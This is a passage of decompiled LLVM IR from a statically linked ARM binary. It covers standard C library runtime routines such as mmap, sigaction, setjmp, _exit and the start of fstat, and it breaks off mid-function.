  %v2_15f28 = add i32 %v2_15f24.pre, -67196
  store i32 %v2_15f28, i32* %r2.global-to-local, align 4
  store i32 %v2_15f28, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f30 = icmp eq i32 %v2_15f28, 0
  store i1 %v2_15f30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f30, label %dec_label_pc_15f48, label %dec_label_pc_15f38

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f20
  store i32 89920, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_15f28)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15f44 = load i32, i32* %r0.global-to-local, align 4
  %v2_15f44 = inttoptr i32 %v1_15f44 to i32*
  store i32 0, i32* %v2_15f44, align 4
  %v2_15f4c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_15f48

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f20, %dec_label_pc_15f38
  %v2_15f4c = phi i32 [ %v2_15f24.pre, %dec_label_pc_15f20 ], [ %v2_15f4c.pre, %dec_label_pc_15f38 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_15f4c, i32* %r1.global-to-local, align 4
  %v2_15f50 = add i32 %v2_15f4c, 128
  %v3_15f50 = inttoptr i32 %v2_15f50 to i32*
  %v4_15f50 = load i32, i32* %v3_15f50, align 4
  store i32 %v4_15f50, i32* %r2.global-to-local, align 4
  store i32 %v4_15f50, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f58 = icmp eq i32 %v4_15f50, 0
  store i1 %v2_15f58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f58, label %dec_label_pc_15f70, label %dec_label_pc_15f60

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f48
  store i32 89960, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15f50)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15f6c = load i32, i32* %r0.global-to-local, align 4
  %v2_15f6c = inttoptr i32 %v1_15f6c to i32*
  store i32 0, i32* %v2_15f6c, align 4
  br label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f60
  %v2_15f70 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_15f70, i32* @r0, align 4
  %v1_15f74 = call i32 @_setjmp(i32 %v2_15f70)
  store i32 %v1_15f74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f78 = icmp eq i32 %v1_15f74, 0
  store i1 %v2_15f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f78, label %dec_label_pc_15f80, label %dec_label_pc_15fcc

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f70
  %v0_15f80 = call i32 @__aeabi_read_tp()
  store i32 %v0_15f80, i32* %r0.global-to-local, align 4
  %v1_15f84 = add i32 %v0_15f80, -1168
  store i32 %v1_15f84, i32* %r2.global-to-local, align 4
  %v2_15f8c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15f8c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15f98 = add i32 %v2_15f8c, 56
  %v3_15f98 = inttoptr i32 %v2_15f98 to i32*
  %v4_15f98 = load i32, i32* %v3_15f98, align 4
  store i32 %v4_15f98, i32* %ip.global-to-local, align 4
  store i32 %v2_15f70, i32* %r3.global-to-local, align 4
  %v2_15fa8 = add i32 %v0_15f80, -1040
  %v3_15fa8 = inttoptr i32 %v2_15fa8 to i32*
  store i32 %v2_15f70, i32* %v3_15fa8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15fb4 = load i32, i32* %ip.global-to-local, align 4
  %v1_15fb4 = inttoptr i32 %v0_15fb4 to i32*
  %v2_15fb4 = load i32, i32* %v1_15fb4, align 4
  store i32 %v2_15fb4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15fc4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16068

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15f70
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_15fd0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15fd0, i32* %ip.global-to-local, align 4
  %v2_15fd4 = add i32 %v2_15fd0, 40
  %v3_15fd4 = inttoptr i32 %v2_15fd4 to i32*
  %v4_15fd4 = load i32, i32* %v3_15fd4, align 4
  store i32 %v4_15fd4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15fd4)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_15fe4 = load i32, i32* %stack_var_-416, align 4
  %v2_15fe8 = add i32 %v2_15fe4, 120
  %v3_15fe8 = inttoptr i32 %v2_15fe8 to i32*
  %v4_15fe8 = load i32, i32* %v3_15fe8, align 4
  store i32 %v4_15fe8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %dec_label_pc_16020.dec_label_pc_15fec_crit_edge, %dec_label_pc_15fcc
  %v0_15fec = phi i32 [ %v0_15fec.pre, %dec_label_pc_16020.dec_label_pc_15fec_crit_edge ], [ %v4_15fe8, %dec_label_pc_15fcc ]
  %v1_15fec = inttoptr i32 %v0_15fec to i32*
  %v2_15fec = load i32, i32* %v1_15fec, align 4
  store i32 %v0_15fec, i32* %r2.global-to-local, align 4
  store i32 %v2_15fec, i32* %r4.global-to-local, align 4
  %v1_15ff8 = add i32 %v2_15fec, -1
  store i32 %v1_15ff8, i32* %r1.global-to-local, align 4
  %v2_15ffc89 = load i32, i32* %v1_15fec, align 4
  store i32 %v2_15ffc89, i32* %r3.global-to-local, align 4
  %v3_1600091 = icmp uge i32 %v2_15ffc89, %v2_15fec
  store i1 %v3_1600091, i1* %cpsr_c.global-to-local, align 1
  %v9_1600097 = icmp eq i32 %v2_15ffc89, %v2_15fec
  store i1 %v9_1600097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1600097, label %dec_label_pc_16008, label %dec_label_pc_16020

dec_label_pc_16008:                               ; preds = %dec_label_pc_15fec, %dec_label_pc_16008.dec_label_pc_15ffc_crit_edge
  %v0_1600898 = phi i32 [ %v1_16000.pre, %dec_label_pc_16008.dec_label_pc_15ffc_crit_edge ], [ %v2_15fec, %dec_label_pc_15fec ]
  store i32 %v0_1600898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16018 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16018, label %dec_label_pc_1601c, label %dec_label_pc_16008.dec_label_pc_15ffc_crit_edge

dec_label_pc_16008.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_16008
  %v0_15ffc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16000.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15ffc = inttoptr i32 %v0_15ffc.pre to i32*
  %v2_15ffc = load i32, i32* %v1_15ffc, align 4
  store i32 %v2_15ffc, i32* %r3.global-to-local, align 4
  %v3_16000 = icmp uge i32 %v2_15ffc, %v1_16000.pre
  store i1 %v3_16000, i1* %cpsr_c.global-to-local, align 1
  %v9_16000 = icmp eq i32 %v2_15ffc, %v1_16000.pre
  store i1 %v9_16000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16000, label %dec_label_pc_16008, label %dec_label_pc_16020

dec_label_pc_1601c:                               ; preds = %dec_label_pc_16008
  %v0_1601c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1601c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %dec_label_pc_15fec, %dec_label_pc_16008.dec_label_pc_15ffc_crit_edge, %dec_label_pc_1601c
  %v0_16028 = phi i32 [ %v0_1601c, %dec_label_pc_1601c ], [ %v2_15ffc89, %dec_label_pc_15fec ], [ %v2_15ffc, %dec_label_pc_16008.dec_label_pc_15ffc_crit_edge ]
  %v1_16020 = phi i32 [ %v0_1601c, %dec_label_pc_1601c ], [ %v2_15fec, %dec_label_pc_15fec ], [ %v1_16000.pre, %dec_label_pc_16008.dec_label_pc_15ffc_crit_edge ]
  %v3_16020 = icmp uge i32 %v0_16028, %v1_16020
  store i1 %v3_16020, i1* %cpsr_c.global-to-local, align 1
  %v9_16020 = icmp eq i32 %v0_16028, %v1_16020
  store i1 %v9_16020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16020, label %dec_label_pc_16028, label %dec_label_pc_16020.dec_label_pc_15fec_crit_edge

dec_label_pc_16020.dec_label_pc_15fec_crit_edge:  ; preds = %dec_label_pc_16020
  %v0_15fec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fec

dec_label_pc_16028:                               ; preds = %dec_label_pc_16020
  %v2_16028 = icmp ne i32 %v1_16020, 0
  store i1 %v2_16028, i1* %cpsr_c.global-to-local, align 1
  %v7_16028 = icmp eq i32 %v1_16020, 1
  store i1 %v7_16028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16028, label %dec_label_pc_16068, label %dec_label_pc_16030

dec_label_pc_16030:                               ; preds = %dec_label_pc_16028
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16068

dec_label_pc_16068:                               ; preds = %dec_label_pc_16028, %dec_label_pc_16030, %dec_label_pc_15f80
  %storemerge2 = phi i32 [ %v0_15fc4, %dec_label_pc_15f80 ], [ 0, %dec_label_pc_16030 ], [ 0, %dec_label_pc_16028 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1606c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1606c, i32* %r0.global-to-local, align 4
  %v0_16070 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16070, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_16068
  %v2_16074 = load i32, i32* @r8, align 4
  %v8_16074 = shl i32 %v2_16074, %v1_1606c
  %v9_16074 = and i32 %v8_16074, %v1_1606c
  %v8_16078 = lshr i32 %v2_16074, %v9_16074
  %v9_16078 = and i32 %v8_16078, %v9_16074
  %v2_1607c = inttoptr i32 %v9_16078 to i64*
  %v3_1607c = load i64, i64* %v2_1607c, align 4
  %v4_1607c = load i32, i32* %r4.global-to-local, align 4
  %v5_1607c = trunc i64 %v3_1607c to i32
  %v6_1607c = udiv i64 %v3_1607c, 4294967296
  %v7_1607c = trunc i64 %v6_1607c to i32
  store i32 %v5_1607c, i32* %r1.global-to-local, align 4
  %v9_1607c = sub i32 %v7_1607c, %v4_1607c
  %v3_16080 = mul i32 %v9_1607c, %v4_1607c
  %v5_16088 = mul i32 %v3_16080, 4
  %v5_1608c = udiv i32 %v4_1607c, 2
  %v6_16088 = and i32 %v3_16080, %v5_1608c
  %v6_1608c = and i32 %v6_16088, %v5_16088
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1608c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16068, %bb85
  %v5_16090 = phi i32 [ %v1_1606c, %dec_label_pc_16068 ], [ %v6_1608c, %bb85 ]
  ret i32 %v5_16090

; uselistorder directives
  uselistorder i32 %v3_16080, { 1, 0 }
  uselistorder i32 %v1_1606c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_16020, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1601c, { 1, 0, 2 }
  uselistorder i32 %v1_16000.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15fec, { 1, 0 }
  uselistorder i32 %v2_15f4c, { 1, 0 }
  uselistorder i32 %v2_15f24.pre, { 2, 0, 1 }
  uselistorder i32 %v1_15f18, { 1, 0 }
  uselistorder i32 %v1_15f14, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15f08, { 1, 0 }
  uselistorder i32 %v1_15ed4, { 1, 0 }
  uselistorder i32 %v1_15ed0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15ec4, { 1, 0 }
  uselistorder i32 %v2_15ea0, { 1, 0, 2 }
  uselistorder i32 %v4_15e84, { 1, 0, 2 }
  uselistorder i32 %v4_15e74, { 1, 0, 2, 3 }
  uselistorder i1 %v8_15dbc, { 1, 2, 0 }
  uselistorder i32 %v2_15d88, { 1, 2, 0 }
  uselistorder i32 %v1_15d84, { 1, 2, 0 }
  uselistorder i1 %v2_15d70, { 1, 0, 2 }
  uselistorder i32 %v5_15d74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15d40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15d28, { 1, 0, 2 }
  uselistorder i32 %v2_15d1c, { 1, 0, 2 }
  uselistorder i32 %v3_15cec, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 1, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 4, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 0, 10, 11, 12, 14, 13, 1, 15, 17, 16, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 3, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 8, 7, 6, 3, 4, 5 }
  uselistorder i32 2004, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_16068, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16008, { 1, 0 }
  uselistorder label %dec_label_pc_15f70, { 1, 0 }
  uselistorder label %dec_label_pc_15f48, { 1, 0 }
  uselistorder label %dec_label_pc_15ec4, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15e40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15e18, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_15d88, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_15d70, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_160bc = load i32, i32* @r4, align 4
  store i32 %v3_160bc, i32* %stack_var_-16, align 4
  %v3_160c8 = urem i32 %arg3, 4096
  %v2_160cc = icmp eq i32 %v3_160c8, 0
  br i1 %v2_160cc, label %dec_label_pc_160f0, label %dec_label_pc_160d4

dec_label_pc_160d4:                               ; preds = %entry
  %v0_160d8 = call i32 @__aeabi_read_tp()
  store i32 %v0_160d8, i32* %r0.global-to-local, align 4
  %v3_160dc = load i16, i16* @global_var_23068.363, align 2
  %v4_160dc = sext i16 %v3_160dc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_160e8 = add i32 %v4_160dc, %v0_160d8
  %v4_160e8 = inttoptr i32 %v3_160e8 to i32*
  store i32 22, i32* %v4_160e8, align 4
  %v0_16124.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16124

dec_label_pc_160f0:                               ; preds = %entry
  %v0_16100 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16100, -4095
  br i1 %tmp, label %dec_label_pc_16120, label %dec_label_pc_16108

dec_label_pc_16108:                               ; preds = %dec_label_pc_160f0
  %v1_1610c = sub i32 0, %v0_16100
  %v3_16110 = load i16, i16* @global_var_23068.363, align 2
  %v4_16110 = sext i16 %v3_16110 to i32
  %v0_16114 = call i32 @__aeabi_read_tp()
  %v3_16118 = add i32 %v4_16110, %v0_16114
  %v4_16118 = inttoptr i32 %v3_16118 to i32*
  store i32 %v1_1610c, i32* %v4_16118, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16120

dec_label_pc_16120:                               ; preds = %dec_label_pc_160f0, %dec_label_pc_16108
  %v0_16120 = phi i32 [ %v0_16100, %dec_label_pc_160f0 ], [ -1, %dec_label_pc_16108 ]
  store i32 %v0_16120, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16124

dec_label_pc_16124:                               ; preds = %dec_label_pc_160d4, %dec_label_pc_16120
  %v0_16124 = phi i32 [ %v0_16124.pre, %dec_label_pc_160d4 ], [ %v0_16120, %dec_label_pc_16120 ]
  store i32 %v0_16124, i32* %r0.global-to-local, align 4
  %v2_16128 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16128, i32* @r4, align 4
  ret i32 %v0_16124

; uselistorder directives
  uselistorder i32 %v0_16124, { 1, 0 }
  uselistorder i32 %v0_16100, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_16124, { 1, 0 }
  uselistorder label %dec_label_pc_16120, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_16138 = load i32, i32* @lr, align 4
  store i32 %v0_16138, i32* %stack_var_-4, align 4
  %v0_16140 = load i32, i32* @r0, align 4
  %v3_16144 = load i16, i16* @global_var_23068.363, align 2
  %v4_16144 = sext i16 %v3_16144 to i32
  store i32 %v4_16144, i32* @r2, align 4
  %v0_16148 = call i32 @__aeabi_read_tp()
  %v1_1614c = sub i32 0, %v0_16140
  store i32 %v1_1614c, i32* @r3, align 4
  %v2_16150 = load i32, i32* @r2, align 4
  %v3_16150 = add i32 %v2_16150, %v0_16148
  %v4_16150 = inttoptr i32 %v3_16150 to i32*
  store i32 %v1_1614c, i32* %v4_16150, align 4
  %v2_16158 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16158, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16164 = load i32, i32* @r4, align 4
  %v6_16164 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1616c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1616c, label %dec_label_pc_161c0, label %dec_label_pc_16184

dec_label_pc_16184:                               ; preds = %entry
  %v1_16184 = add i32 %arg2, 4
  %v2_16184 = inttoptr i32 %v1_16184 to i32*
  %v3_16184 = load i32, i32* %v2_16184, align 4
  store i32 %v3_16184, i32* @r3, align 4
  %v1_16188 = and i32 %v3_16184, 67108864
  %v2_16188 = icmp eq i32 %v1_16188, 0
  br i1 %v2_16188, label %dec_label_pc_16190, label %dec_label_pc_161c0

dec_label_pc_16190:                               ; preds = %dec_label_pc_16184
  store i32 20, i32* @r2, align 4
  %v2_16194 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16194, i32* @r0, align 4
  %v0_16198 = call i32 @memcpy()
  store i32 %v2_16194, i32* @ip, align 4
  %v0_161c0.pre = load i32, i32* @r5, align 4
  %v0_161c8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_161c0

dec_label_pc_161c0:                               ; preds = %dec_label_pc_16184, %entry, %dec_label_pc_16190
  %v0_161c8 = phi i32 [ %arg3, %dec_label_pc_16184 ], [ %arg3, %entry ], [ %v0_161c8.pre, %dec_label_pc_16190 ]
  %v0_161c4 = phi i32 [ %arg2, %dec_label_pc_16184 ], [ 0, %entry ], [ %v2_16194, %dec_label_pc_16190 ]
  %v0_161c0 = phi i32 [ %arg1, %dec_label_pc_16184 ], [ %arg1, %entry ], [ %v0_161c0.pre, %dec_label_pc_16190 ]
  %v4_161d0 = call i32 @__syscall_rt_sigaction(i32 %v0_161c0, i32 %v0_161c4, i32 %v0_161c8, i32 8)
  store i32 %v3_16164, i32* @r4, align 4
  store i32 %v6_16164, i32* @r5, align 4
  ret i32 %v4_161d0

; uselistorder directives
  uselistorder label %dec_label_pc_161c0, { 2, 0, 1 }
}

define i32 @function_161e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_161e4:
  %v0_161e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_161e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_161e4
  %v2_161e4 = load i32, i32* @r8, align 4
  %v4_161e4 = mul i32 %v2_161e4, 2
  %v5_161e4 = and i32 %v4_161e4, %arg1
  %v2_161e8 = load i32, i32* @ip, align 4
  %v4_161e8 = lshr i32 %v2_161e8, %v5_161e4
  %v5_161e8 = sub i32 32, %v5_161e4
  %v6_161e8 = shl i32 %v2_161e8, %v5_161e8
  %v7_161e8 = or i32 %v6_161e8, %v4_161e8
  %v9_161e8 = and i32 %v7_161e8, %v5_161e4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_161e4, %bb
  %v10_161e8 = phi i32 [ %arg1, %dec_label_pc_161e4 ], [ %v9_161e8, %bb ]
  ret i32 %v10_161e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_161f0 = call i32 @__sigsetjmp()
  ret i32 %v0_161f0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16220 = load i32, i32* @r7, align 4
  store i32 %v3_16220, i32* %stack_var_-8, align 4
  %v0_1622c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1622c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1622c, -4095
  br i1 %tmp, label %dec_label_pc_16254, label %dec_label_pc_1623c

dec_label_pc_1623c:                               ; preds = %entry
  %v0_16240 = call i32 @__aeabi_read_tp()
  %v3_16244 = load i16, i16* @global_var_23068.363, align 2
  %v4_16244 = sext i16 %v3_16244 to i32
  %v0_16248 = load i32, i32* %r2.global-to-local, align 4
  %v1_16248 = sub i32 0, %v0_16248
  store i32 %v1_16248, i32* %r2.global-to-local, align 4
  %v3_1624c = add i32 %v4_16244, %v0_16240
  %v4_1624c = inttoptr i32 %v3_1624c to i32*
  store i32 %v1_16248, i32* %v4_1624c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16254.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16254

dec_label_pc_16254:                               ; preds = %entry, %dec_label_pc_1623c
  %v1_16258 = phi i32 [ %v0_1622c, %entry ], [ -1, %dec_label_pc_1623c ]
  %v2_16254 = phi i32 [ %v3_16220, %entry ], [ %v2_16254.pre, %dec_label_pc_1623c ]
  store i32 %v2_16254, i32* @r7, align 4
  ret i32 %v1_16258

; uselistorder directives
  uselistorder i32 %v0_1622c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16254, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1626c

dec_label_pc_1626c:                               ; preds = %dec_label_pc_16298, %dec_label_pc_162ac, %entry
  %v0_1626c = phi i32 [ %arg1, %entry ], [ %v0_1626c.pre.pre, %dec_label_pc_162ac ], [ %v0_16298, %dec_label_pc_16298 ]
  store i32 %v0_1626c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1626c, -4095
  br i1 %tmp, label %dec_label_pc_16298, label %dec_label_pc_16288

dec_label_pc_16288:                               ; preds = %dec_label_pc_1626c
  %v0_16288 = call i32 @__aeabi_read_tp()
  %v0_1628c = load i32, i32* %r2.global-to-local, align 4
  %v1_1628c = sub i32 0, %v0_1628c
  store i32 %v1_1628c, i32* %r2.global-to-local, align 4
  %v3_16290 = load i16, i16* @global_var_23068.363, align 2
  %v4_16290 = sext i16 %v3_16290 to i32
  %v3_16294 = add i32 %v4_16290, %v0_16288
  %v4_16294 = inttoptr i32 %v3_16294 to i32*
  store i32 %v1_1628c, i32* %v4_16294, align 4
  %v0_16298.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16298

dec_label_pc_16298:                               ; preds = %dec_label_pc_1626c, %dec_label_pc_16288
  %v0_16298 = phi i32 [ %v0_1626c, %dec_label_pc_1626c ], [ %v0_16298.pre, %dec_label_pc_16288 ]
  store i32 %v0_16298, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_16298, -4095
  br i1 %tmp4, label %dec_label_pc_1626c, label %dec_label_pc_162ac

dec_label_pc_162ac:                               ; preds = %dec_label_pc_16298
  %v0_162ac = call i32 @__aeabi_read_tp()
  %v0_162b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_162b0 = sub i32 0, %v0_162b0
  store i32 %v1_162b0, i32* %r2.global-to-local, align 4
  %v3_162b4 = load i16, i16* @global_var_23068.363, align 2
  %v4_162b4 = sext i16 %v3_162b4 to i32
  %v3_162b8 = add i32 %v4_162b4, %v0_162ac
  %v4_162b8 = inttoptr i32 %v3_162b8 to i32*
  store i32 %v1_162b0, i32* %v4_162b8, align 4
  %v0_1626c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1626c

; uselistorder directives
  uselistorder i32 %v0_16298, { 0, 2, 1 }
  uselistorder i32 %v0_1626c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16298, { 1, 0 }
  uselistorder label %dec_label_pc_1626c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_162d0 = load i32, i32* @r1, align 4
  store i32 %v0_162d0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_162e0 = load i32, i32* @r0, align 4
  store i32 %v0_162e0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_162e0, -4095
  br i1 %tmp, label %dec_label_pc_16308, label %dec_label_pc_162ec

dec_label_pc_162ec:                               ; preds = %entry
  %v0_162f0 = call i32 @__aeabi_read_tp()
  %v3_162f4 = load i16, i16* @global_var_23068.363, align 2
  %v4_162f4 = sext i16 %v3_162f4 to i32
  store i32 %v4_162f4, i32* @r3, align 4
  %v0_162f8 = load i32, i32* @r2, align 4
  %v1_162f8 = sub i32 0, %v0_162f8
  store i32 %v1_162f8, i32* @r2, align 4
